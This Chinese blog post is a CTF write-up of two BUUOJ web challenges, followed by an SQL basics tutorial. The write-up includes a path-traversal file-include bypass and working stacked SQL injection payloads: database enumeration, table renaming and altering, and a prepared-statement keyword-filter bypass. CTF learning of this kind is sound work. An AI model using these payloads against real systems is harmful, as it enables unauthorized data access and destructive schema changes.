<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="note,">










<meta name="description" content="WarmUp_随便注前言：看是正式当一名web狗的第一天：先直接上https://buuoj.cn/challenges，面向题目学习。 WarmUp基操后拿到源码和hint：flag not here, and flag in ffffllllaaaagggg 所以是简单的代码审计题目了： 12345678910111213141516171819202122232425262728293031">
<meta name="keywords" content="note">
<meta property="og:type" content="article">
<meta property="og:title" content="WarmUp_随便注">
<meta property="og:url" content="http://yoursite.com/2019/07/28/WarmUp_随便注/index.html">
<meta property="og:site_name" content="V&#39;s blog">
<meta property="og:description" content="WarmUp_随便注前言：看是正式当一名web狗的第一天：先直接上https://buuoj.cn/challenges，面向题目学习。 WarmUp基操后拿到源码和hint：flag not here, and flag in ffffllllaaaagggg 所以是简单的代码审计题目了： 12345678910111213141516171819202122232425262728293031">
<meta property="og:locale" content="zh-Hans">
<meta property="og:image" content="http://yoursite.com/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564223770751.png">
<meta property="og:image" content="http://yoursite.com/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564223854147.png">
<meta property="og:image" content="http://yoursite.com/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564223974234.png">
<meta property="og:image" content="http://yoursite.com/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564224074931.png">
<meta property="og:image" content="http://yoursite.com/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564224134301.png">
<meta property="og:image" content="http://yoursite.com/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564224334629.png">
<meta property="og:image" content="http://yoursite.com/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/2.jpg">
<meta property="og:updated_time" content="2019-09-21T03:52:11.967Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="WarmUp_随便注">
<meta name="twitter:description" content="WarmUp_随便注前言：看是正式当一名web狗的第一天：先直接上https://buuoj.cn/challenges，面向题目学习。 WarmUp基操后拿到源码和hint：flag not here, and flag in ffffllllaaaagggg 所以是简单的代码审计题目了： 12345678910111213141516171819202122232425262728293031">
<meta name="twitter:image" content="http://yoursite.com/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564223770751.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/2019/07/28/WarmUp_随便注/">





  <title>WarmUp_随便注 | V's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">V's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Daily life of a rookie</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/28/WarmUp_随便注/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="V">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="V's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">WarmUp_随便注</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-28T22:43:55+08:00">
                2019-07-28
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <h1 id="WarmUp-随便注"><a href="#WarmUp-随便注" class="headerlink" title="WarmUp_随便注"></a>WarmUp_随便注</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>看是正式当一名web狗的第一天：先直接上<a href="https://buuoj.cn/challenges，面向题目学习。" target="_blank" rel="noopener">https://buuoj.cn/challenges，面向题目学习。</a></p>
<h3 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h3><p>基操后拿到源码和hint：flag not here, and flag in ffffllllaaaagggg</p>
<p>所以是简单的代码审计题目了：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">            $_page = mb_substr(</span></span><br><span class="line"><span class="php">                $page,</span></span><br><span class="line"><span class="php">                <span class="number">0</span>,</span></span><br><span class="line"><span class="php">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">            );</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">            $_page = urldecode($page);</span></span><br><span class="line"><span class="php">            $_page = mb_substr(</span></span><br><span class="line"><span class="php">                $_page,</span></span><br><span class="line"><span class="php">                <span class="number">0</span>,</span></span><br><span class="line"><span class="php">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span></span><br><span class="line"><span class="php">            );</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span></span><br><span class="line"><span class="php">    ) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="php">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>先看下面，file要有值，然后是个字符串，然后进入check类</p>
<p>要求：</p>
<ol>
<li><p>如果$page在白名单，则成功，但显然flag不在白名单，所以过~</p>
</li>
<li><p>以‘?’分割$page，</p>
</li>
<li><p>第一部分内容要在白名单内，构造file=source.php?</p>
<p>然后就可以通过判断了，那就不管了，直接读flag</p>
</li>
</ol>
<p>构造payload：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>web5.buuoj.cn<span class="regexp">/index.php?file=source.php?../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<h3 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h3><p>这一题就属于今天要学习的内容了，所以是面向Wp解题（两种解题方法）</p>
<p>首先提交试试</p>
<p><img src="/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564223770751.png" alt="1564223770751"></p>
<p>然后测试注入</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://web<span class="number">16</span>.buuoj.cn/?inject=<span class="number">1</span>' <span class="keyword">or</span> '<span class="number">1</span>'='<span class="number">1</span></span><br><span class="line">http://web<span class="number">16</span>.buuoj.cn/?inject=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">or</span><span class="symbol">%20</span><span class="symbol">%271</span><span class="symbol">%27</span>=<span class="symbol">%271</span></span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564223854147.png" alt="1564223854147"></p>
<p>然后随便试了试发现过滤</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//web16.buuoj.cn/?inject=1where</span></span><br></pre></td></tr></table></figure>

<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match("/<span class="keyword">select</span>|<span class="keyword">update</span>|<span class="keyword">delete</span>|<span class="keyword">drop</span>|<span class="keyword">insert</span>|<span class="keyword">where</span>|\./i<span class="string">",$inject);</span></span><br></pre></td></tr></table></figure>

<p>然后师傅们很牛逼的就知道他是堆叠注入了（学）</p>
<p>列数据库</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">222</span>%<span class="number">27</span>%<span class="number">3</span>Bshow+databases%<span class="number">3</span>B%<span class="number">23</span></span><br><span class="line">/?inject=<span class="number">222</span>';show databases;#</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564223974234.png" alt="1564223974234"></p>
<p>然后看表</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">222</span>%<span class="number">27</span>%<span class="number">3</span>Bshow+tables%<span class="number">3</span>B%<span class="number">23</span></span><br><span class="line">/?inject=<span class="number">222</span>';show tables;#</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564224074931.png" alt="1564224074931"></p>
<p>再看这个数字表里的列</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">222</span>%<span class="number">27</span>%<span class="number">3</span>Bshow+columns%<span class="number">20</span>from%<span class="number">20</span>`<span class="number">1919810931114514</span>`%<span class="number">3</span>B%<span class="number">23</span></span><br><span class="line">/?inject=<span class="number">222</span>';show columns from `<span class="number">1919810931114514</span>`;#</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564224134301.png" alt="1564224134301"></p>
<p>这个NO是不是代表不让读啊，反正师傅们都没去读它</p>
<p>顺便看看那个words表</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">222</span>%<span class="number">27</span>%<span class="number">3</span>Bshow+columns%<span class="number">20</span>from%<span class="number">20</span>`words`%<span class="number">3</span>B%<span class="number">23</span></span><br><span class="line">/?inject=<span class="number">222</span>';show columns from `words`;#</span><br></pre></td></tr></table></figure>

<p><img src="/2019/07/28/WarmUp_%E9%9A%8F%E4%BE%BF%E6%B3%A8/1564224334629.png" alt="1564224334629"></p>
<p>这个复现环境里都是NO，可是原题是YES啊，那为啥flag不让直接读呢，（后来想想，大概是没这个语法2333）而是、、、</p>
<p>方法一：改名</p>
<p>9.他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。</p>
<p>先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。</p>
<p>这样就可以让程序直接查询出 flag 了。</p>
<p>构造 payload 如下，然后访问，看到这个看来就执行到最后一个语句了。（改表名那里直接从 pma 拷了一个语句过来改- -）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?inject=1%27;<span class="keyword">RENAME</span>%<span class="number">20</span><span class="keyword">TABLE</span>%<span class="number">20</span><span class="string">`words`</span>%<span class="number">20</span><span class="keyword">TO</span>%<span class="number">20</span><span class="string">`words1`</span>;<span class="keyword">RENAME</span>%<span class="number">20</span><span class="keyword">TABLE</span>%<span class="number">20</span><span class="string">`1919810931114514`</span>%<span class="number">20</span><span class="keyword">TO</span>%<span class="number">20</span><span class="string">`words`</span>;<span class="keyword">ALTER</span>%<span class="number">20</span><span class="keyword">TABLE</span>%<span class="number">20</span><span class="string">`words`</span>%<span class="number">20</span><span class="keyword">CHANGE</span>%<span class="number">20</span><span class="string">`flag`</span>%<span class="number">20</span><span class="string">`id`</span>%<span class="number">20</span><span class="built_in">VARCHAR</span>(<span class="number">100</span>)%<span class="number">20</span><span class="built_in">CHARACTER</span>%<span class="number">20</span><span class="keyword">SET</span>%<span class="number">20</span>utf8%<span class="number">20</span><span class="keyword">COLLATE</span>%<span class="number">20</span>utf8_general_ci%<span class="number">20</span><span class="keyword">NOT</span>%<span class="number">20</span><span class="literal">NULL</span>;<span class="keyword">show</span>%<span class="number">20</span><span class="keyword">columns</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>words;<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">/?inject=1';<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">TO</span> <span class="string">`words1`</span>;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">TO</span> <span class="string">`words`</span>;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">CHANGE</span> <span class="string">`flag`</span> <span class="string">`id`</span> <span class="built_in">VARCHAR</span>(<span class="number">100</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">NOT</span> <span class="literal">NULL</span>;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>然后</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web<span class="number">16</span>.buuoj.cn/?inject=<span class="number">1</span><span class="symbol">%27</span><span class="symbol">%20</span><span class="keyword">or</span><span class="symbol">%20</span><span class="symbol">%271</span><span class="symbol">%27</span>=<span class="symbol">%271</span></span><br></pre></td></tr></table></figure>

<p>方法二：</p>
<p>由于过滤了 <strong>select</strong> 等关键字，我们可以用<strong>预编译</strong>来构造带有 <strong>select</strong> 的 <strong>sql</strong> 语句。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">'sel'</span>,<span class="string">'ect * from `1919810931114514`'</span>);</span><br><span class="line"><span class="keyword">prepare</span> presql <span class="keyword">from</span> @<span class="keyword">sql</span>;</span><br><span class="line"><span class="keyword">execute</span> presql;</span><br><span class="line"><span class="keyword">deallocate</span> <span class="keyword">prepare</span> presql</span><br></pre></td></tr></table></figure>

<p>提示</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">strstr</span><span class="params">(<span class="variable">$inject</span>, <span class="string">"set"</span>)</span></span> &amp;&amp; strstr(<span class="variable">$inject</span>, <span class="string">"prepare"</span>)</span><br></pre></td></tr></table></figure>

<p>于是用大小写绕过</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?inject=<span class="number">1</span>'%<span class="number">3</span>bSet+%<span class="number">40</span>sqll%<span class="number">3</span>dconcat('sel','ect+*+from+`<span class="number">1919810931114514</span>`')%<span class="number">3</span>bPrepare+presql+from+%<span class="number">40</span>sqll%<span class="number">3</span>bexecute+presql%<span class="number">3</span>bdeallocate+Prepare+presql%<span class="number">3</span>b%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>​    </p>
<p>感觉这题在buuoj上复现的时候，之所以被那么多少人解出来， 很可能是因为数据库已经被前人改了，所以直接就可以梭出来了。</p>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>由第二题引出今天的学习的内容，堆栈注入和预编译这两个小知识点。（还有SQL基础）</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>“Websites” 表的数据</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use RUNOOB;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">mysql&gt; set names utf8;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT <span class="symbol">*</span> FROM Websites;</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> id </span>|<span class="string"> name         </span>|<span class="string"> url                       </span>|<span class="string"> alexa </span>|<span class="string"> country </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">|<span class="string"> 1  </span>|<span class="string"> Google       </span>|<span class="string"> https://www.google.cm/    </span>|<span class="string"> 1     </span>|<span class="string"> USA     </span>|</span><br><span class="line">|<span class="string"> 2  </span>|<span class="string"> 淘宝          </span>|<span class="string"> https://www.taobao.com/   </span>|<span class="string"> 13    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 3  </span>|<span class="string"> 菜鸟教程      </span>|<span class="string"> http://www.runoob.com/    </span>|<span class="string"> 4689  </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 4  </span>|<span class="string"> 微博          </span>|<span class="string"> http://weibo.com/         </span>|<span class="string"> 20    </span>|<span class="string"> CN      </span>|</span><br><span class="line">|<span class="string"> 5  </span>|<span class="string"> Facebook     </span>|<span class="string"> https://www.facebook.com/ </span>|<span class="string"> 3     </span>|<span class="string"> USA     </span>|</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">5 rows in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<p>解析</p>
<ul>
<li><strong>use RUNOOB;</strong> 命令用于选择数据库。</li>
<li><strong>set names utf8;</strong> 命令用于设置使用的字符集。</li>
<li><strong>SELECT * FROM Websites;</strong> 读取数据表的信息。</li>
<li>上面的表包含五条记录（每一条对应一个网站信息）和5个列（id、name、url、alexa 和country）。</li>
</ul>
<ul>
<li>SQL 对大小写不敏感：SELECT 与 select 是相同的。</li>
</ul>
<h4 id="SQL-语句后面的分号？"><a href="#SQL-语句后面的分号？" class="headerlink" title="SQL 语句后面的分号？"></a>SQL 语句后面的分号？</h4><p>某些数据库系统要求在每条 SQL 语句的末端使用分号。</p>
<p>分号是在数据库系统中分隔每条 SQL 语句的标准方法，这样就可以在对服务器的相同请求中执行一条以上的 SQL 语句。</p>
<p>在本教程中，我们将在每条 SQL 语句的末端使用分号。</p>
<h4 id="一些最重要的-SQL-命令"><a href="#一些最重要的-SQL-命令" class="headerlink" title="一些最重要的 SQL 命令"></a>一些最重要的 SQL 命令</h4><ul>
<li><strong>SELECT</strong> - 从数据库中提取数据</li>
<li><strong>UPDATE</strong> - 更新数据库中的数据</li>
<li><strong>DELETE</strong> - 从数据库中删除数据</li>
<li><strong>INSERT INTO</strong> - 向数据库中插入新数据</li>
<li><strong>CREATE DATABASE</strong> - 创建新数据库</li>
<li><strong>ALTER DATABASE</strong> - 修改数据库</li>
<li><strong>CREATE TABLE</strong> - 创建新表</li>
<li><strong>ALTER TABLE</strong> - 变更（改变）数据库表</li>
<li><strong>DROP TABLE</strong> - 删除表</li>
<li><strong>CREATE INDEX</strong> - 创建索引（搜索键）</li>
<li><strong>DROP INDEX</strong> - 删除索引</li>
</ul>
<h4 id="SQL-SELECT-语句"><a href="#SQL-SELECT-语句" class="headerlink" title="SQL SELECT 语句"></a>SQL SELECT 语句</h4><p>SQL SELECT 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name <span class="keyword">FROM</span> table_name;</span><br><span class="line"></span><br><span class="line">与</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-SELECT-DISTINCT-语句"><a href="#SQL-SELECT-DISTINCT-语句" class="headerlink" title="SQL SELECT DISTINCT 语句"></a>SQL SELECT DISTINCT 语句</h4><p>SELECT DISTINCT 语句用于返回唯一不同的值。</p>
<p>SQL SELECT DISTINCT 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> column_name,column_name <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> country <span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-WHERE-子句"><a href="#SQL-WHERE-子句" class="headerlink" title="SQL WHERE 子句"></a>SQL WHERE 子句</h4><p>WHERE 子句用于过滤记录。</p>
<p>SQL WHERE 语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">operator</span> <span class="keyword">value</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> country=<span class="string">'CN'</span>;</span><br></pre></td></tr></table></figure>

<p>文本字段 vs. 数值字段</p>
<p>SQL 使用单引号来环绕文本值（大部分数据库系统也接受双引号）。</p>
<p>在上个实例中 ‘CN’ 文本字段使用了单引号。</p>
<p>如果是数值字段，请不要使用引号。</p>
<h4 id="SQL-AND-amp-OR-运算符"><a href="#SQL-AND-amp-OR-运算符" class="headerlink" title="SQL AND &amp; OR 运算符"></a>SQL AND &amp; OR 运算符</h4><p>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。</p>
